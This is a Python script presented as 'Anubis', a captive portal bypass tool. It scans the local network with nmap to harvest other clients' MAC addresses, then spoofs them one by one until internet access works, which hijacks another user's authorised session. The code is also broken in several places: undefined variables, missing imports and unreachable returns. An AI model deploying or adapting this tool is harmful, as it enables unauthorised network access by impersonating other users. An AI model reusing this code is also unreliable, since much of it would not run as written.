#!/usr/bin/env python
# -*- coding: utf-8 -*-

#########################################################################
 # DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 #                    Version 2, December 2004
 #
 # Copyright (C) 2018-2019 Sunday Philemon philemonsunday202@gmail.com
 #
 # Everyone is permitted to copy and distribute verbatim or modified
 # copies of this license document, and changing it is allowed as long
 # as the name is changed.
 #
 #            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
 #   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
 #
 #  0. You just DO WHAT THE FUCK YOU WANT TO
########################################################################


import sys
from platform import system as platform, release, node
# import subprocess
from os import system, curdir
import argparse as arg
from argcomplete import autocomplete
import nmap
import urllib2
# import itertools

#vars
ostype = platform()
release = release()
node = node()

#arguments
parser = arg.ArgumentParser(description="\033[1;31mAnubis - Captive Portal Bypass\033[1;m")
parser.add_argument("-i", "--interface", help="The active interface used (Default:wlan0)", default="wlan0")
parser.add_argument("-a", "--address", help="Ip address")

#For argument autocomplete
autocomplete(parser)
argument = parser.parse_args()

def test_connection():
    try:
        urllib2.urlopen('http://216.58.192.142', timeout=1)
        return True
    except urllib2.URLError as err:
        return False

def iface_ip(iface):
    """Derives ip address from the interface"""
    try:
        from socket import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
                s.fileno(),
                0x8915,
                struct.pack('256s', str(self.iface[:15]))
            )[20:24])
    except IOError as e:
        return ""
    ip = ""

def scan_mac(ip, iface='wlan0'):
    """Scans mac addresses in /24 range and return scan list"""
    s = nmap.PortScanner()
    print("Scanning...")
    y = s.scan(hosts=ip + '/24',arguments='-sP '+ iface, sudo=True)
    scan = y.get('scan')
    mac_list = []# Initialise empty list
    for i in scan.keys():# Add mac addresses to the list
        mac_list.append(scan.get(scan.keys()[scan.keys().index(i)]).get('addresses').get('mac'))
    return mac_list

def set_mac(mac_list, iface):
    """Sets mac addresses from mac list using SpoofMAC submodule"""
    try:
        for i in mac_list:
            system(sys.executable + '' + curdir + 'core/SpoofMAC/spoofmac.py set ' + i + ' '+ iface )#Run SpoofMAC
            if test_connection() == True:
                break
                return True#successfully exploited
            else:
                print "MAC {} not successful".format(i)
    except IndexError:
        pass
    except ValueError:
        pass

# print help if no arguments detected
if len(sys.argv)==1:
    print("""\033[1;31m
           █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
          ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝
          ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗\033[1;32m
          ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
          ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
          ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝\033[1;34m
          Running on {} {} {}
    \033[1;m""").format(ostype,release,node)
    system(sys.executable + ' '+ curdir +'/anubis.py --help')

else:
    ip = iface_ip(argument.interface)
    list = scan_mac(ip, iface)
    set_mac(list, iface )
